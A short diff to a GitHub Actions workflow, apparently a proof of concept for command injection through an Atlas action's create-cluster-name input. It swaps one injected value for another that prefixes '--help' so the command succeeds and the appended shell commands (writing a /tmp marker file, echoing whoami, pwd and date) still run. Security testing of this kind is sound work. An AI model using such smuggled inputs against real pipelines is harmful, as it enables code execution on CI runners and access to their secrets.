@@ -19,7 +19,8 @@ jobs:
         with:
           # Command injection via create-cluster-name
           # The injected command executes even though atlas command will fail
-          create-cluster-name: "test-cluster; echo '🚨 INJECTION via create-cluster-name 🚨' > /tmp/cluster-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/cluster-injection-poc.txt || true"
+          # Using --help makes the command succeed, then our injected commands execute
+          create-cluster-name: "--help; echo '🚨 INJECTION via create-cluster-name 🚨' > /tmp/cluster-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/cluster-injection-poc.txt || true"
           tier: "M0"
           provider: "AWS"
           region: "US_EAST_1"
